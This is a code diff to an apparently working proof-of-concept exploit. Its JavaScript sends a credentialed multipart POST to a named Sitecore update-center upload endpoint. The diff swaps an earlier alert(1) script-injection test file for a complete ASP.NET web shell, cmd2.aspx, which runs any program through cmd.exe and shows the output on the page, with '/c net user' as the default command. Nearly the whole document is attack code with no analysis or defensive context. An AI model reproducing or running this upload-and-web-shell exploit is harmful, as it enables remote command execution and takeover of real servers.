@@ -2,15 +2,48 @@
         var xhr = new XMLHttpRequest();
         xhr.open("POST", "https:\/\/cm.dxp-dev.lenovo.com\/sitecore\/api\/ssc\/updatecenter\/upload\/-\/upload?sc_site=shell", true);
         xhr.setRequestHeader("Accept", "application\/json, text\/plain, *\/*");
-        xhr.setRequestHeader("Accept-Language", "uk-UA,uk;q=0.8,en-US;q=0.5,en;q=0.3");
-        xhr.setRequestHeader("Content-Type", "multipart\/form-data; boundary=---------------------------99507141219078795311499387167");
+        xhr.setRequestHeader("Content-Type", "multipart\/form-data; boundary=----WebKitFormBoundarysDKLCnd0ZnL1br9T");
+        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.9");
         xhr.withCredentials = true;
-        var body = "-----------------------------99507141219078795311499387167\r\n" + 
-          "Content-Disposition: form-data; name=\"uploadFile\"; filename=\"sh10.html\"\r\n" + 
-          "Content-Type: text/html\r\n" + 
+        var body = "------WebKitFormBoundarysDKLCnd0ZnL1br9T\r\n" + 
+          "Content-Disposition: form-data; name=\"uploadFile\"; filename=\"cmd2.aspx\"\r\n" + 
+          "Content-Type: application/xml\r\n" + 
           "\r\n" + 
-          "\x3cscript\x3ealert(1)\x3c/script\x3e\r\n" + 
-          "-----------------------------99507141219078795311499387167--\r\n";
+          "\x3c%@ Page Language=\"VB\" Debug=\"true\" %\x3e\r\n" + 
+          "\x3c%@ import Namespace=\"system.IO\" %\x3e\r\n" + 
+          "\x3c%@ import Namespace=\"System.Diagnostics\" %\x3e\r\n" + 
+          "\r\n" + 
+          "\x3cscript runat=\"server\"\x3e      \r\n" + 
+          "Sub RunCmd(Src As Object, E As EventArgs)            \r\n" + 
+          "  Dim myProcess As New Process()            \r\n" + 
+          "  Dim myProcessStartInfo As New ProcessStartInfo(xpath.text)            \r\n" + 
+          "  myProcessStartInfo.UseShellExecute = false            \r\n" + 
+          "  myProcessStartInfo.RedirectStandardOutput = true            \r\n" + 
+          "  myProcess.StartInfo = myProcessStartInfo            \r\n" + 
+          "  myProcessStartInfo.Arguments=xcmd.text            \r\n" + 
+          "  myProcess.Start()            \r\n" + 
+          "  Dim myStreamReader As StreamReader = myProcess.StandardOutput            \r\n" + 
+          "  Dim myString As String = myStreamReader.Readtoend()            \r\n" + 
+          "  myProcess.Close()            \r\n" + 
+          "  mystring=replace(mystring,\"\x3c\",\"&lt;\")            \r\n" + 
+          "  mystring=replace(mystring,\"\x3e\",\"&gt;\")            \r\n" + 
+          "  result.text= vbcrlf & \"\x3cpre\x3e\" & mystring & \"\x3c/pre\x3e\"    \r\n" + 
+          "End Sub\r\n" + 
+          "\x3c/script\x3e\r\n" + 
+          "\r\n" + 
+          "\x3chtml\x3e\r\n" + 
+          "\x3cbody\x3e    \r\n" + 
+          "\x3cform runat=\"server\"\x3e        \r\n" + 
+          "\x3cp\x3e\x3casp:Label id=\"L_p\" runat=\"server\" width=\"80px\"\x3eProgram\x3c/asp:Label\x3e        \r\n" + 
+          "\x3casp:TextBox id=\"xpath\" runat=\"server\" Width=\"300px\"\x3ec:\\windows\\system32\\cmd.exe\x3c/asp:TextBox\x3e        \r\n" + 
+          "\x3cp\x3e\x3casp:Label id=\"L_a\" runat=\"server\" width=\"80px\"\x3eArguments\x3c/asp:Label\x3e        \r\n" + 
+          "\x3casp:TextBox id=\"xcmd\" runat=\"server\" Width=\"300px\" Text=\"/c net user\"\x3e/c net user\x3c/asp:TextBox\x3e        \r\n" + 
+          "\x3cp\x3e\x3casp:Button id=\"Button\" onclick=\"runcmd\" runat=\"server\" Width=\"100px\" Text=\"Run\"\x3e\x3c/asp:Button\x3e        \r\n" + 
+          "\x3cp\x3e\x3casp:Label id=\"result\" runat=\"server\"\x3e\x3c/asp:Label\x3e       \r\n" + 
+          "\x3c/form\x3e\r\n" + 
+          "\x3c/body\x3e\r\n" + 
+          "\x3c/html\x3e\r\n" + 
+          "------WebKitFormBoundarysDKLCnd0ZnL1br9T--\r\n";
         var aBody = new Uint8Array(body.length);
         for (var i = 0; i < aBody.length; i++)
           aBody[i] = body.charCodeAt(i); 
